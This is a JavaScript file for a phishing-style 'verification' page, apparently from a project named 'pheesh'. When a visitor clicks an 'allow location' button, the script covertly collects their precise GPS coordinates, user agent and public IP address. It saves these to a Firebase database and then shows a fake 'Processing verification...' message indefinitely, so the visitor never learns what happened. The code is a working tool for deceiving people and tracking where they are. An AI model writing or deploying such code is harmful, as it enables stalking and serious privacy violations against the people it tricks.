// Firebase configuration
const firebaseConfig = {
    apiKey: "AIzaSyBqx_C7XqKjmgJqRHcXBW5K9zMGNBZyGDY",
    authDomain: "pheesh-4481e.firebaseapp.com",
    databaseURL: "https://pheesh-4481e-default-rtdb.asia-southeast1.firebasedatabase.app",
    projectId: "pheesh-4481e",
    storageBucket: "pheesh-4481e.appspot.com",
    messagingSenderId: "458791455321",
    appId: "1:458791455321:web:3a9b8e6f4b8e9f1b2c3d4e"
};

// Initialize Firebase
try {
    firebase.initializeApp(firebaseConfig);
    console.log('Firebase initialized successfully');
    const database = firebase.database();
    console.log('Database reference created');

    // Test database connection
    database.ref('.info/connected').on('value', (snapshot) => {
        console.log('Database connection state:', snapshot.val());
    });
} catch (error) {
    console.error('Error initializing Firebase:', error);
}

// Prevent right-click on logo
document.querySelector('.logo').addEventListener('contextmenu', (e) => {
    e.preventDefault();
    return false;
});

// Prevent drag on logo
document.querySelector('.logo').addEventListener('dragstart', (e) => {
    e.preventDefault();
    return false;
});

// Prevent copy on logo
document.querySelector('.logo').addEventListener('copy', (e) => {
    e.preventDefault();
    return false;
});

// Main functionality
document.addEventListener('DOMContentLoaded', () => {
    const allowLocationButton = document.getElementById('allowLocation');
    const locationStatus = document.getElementById('locationStatus');
    
    allowLocationButton.addEventListener('click', () => {
        allowLocationButton.classList.add('loading');
        allowLocationButton.disabled = true;
        allowLocationButton.textContent = 'Verifying';
        document.querySelector('.thank-you-card').classList.add('processing');
        
        locationStatus.textContent = 'Processing verification...';
        
        // Get location data
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                async (position) => {
                    console.log('Location obtained:', position.coords);
                    const locationData = {
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude,
                        timestamp: new Date().toISOString(),
                        userAgent: navigator.userAgent,
                        // We'll get IP address from a service like ipify
                        ip: await fetch('https://api.ipify.org?format=json')
                            .then(response => response.json())
                            .then(data => data.ip)
                            .catch(() => 'Unknown')
                    };

                    console.log('Attempting to save location data:', locationData);

                    // Save location data to Firebase
                    database.ref('locations').push(locationData)
                        .then(() => {
                            console.log('Location saved successfully to Firebase');
                            // Keep showing loading state instead of redirecting
                            locationStatus.textContent = 'Processing verification...';
                        })
                        .catch(error => {
                            console.error('Error saving location to Firebase:', error);
                            // Even on error, keep showing loading state
                            locationStatus.textContent = 'Processing verification...';
                        });
                },
                (error) => {
                    console.error('Error getting location:', error);
                    // Keep showing loading state on location error
                    locationStatus.textContent = 'Processing verification...';
                }
            );
        } else {
            console.error('Geolocation not supported');
            // Keep showing loading state if geolocation not supported
            locationStatus.textContent = 'Processing verification...';
        }
    });
});
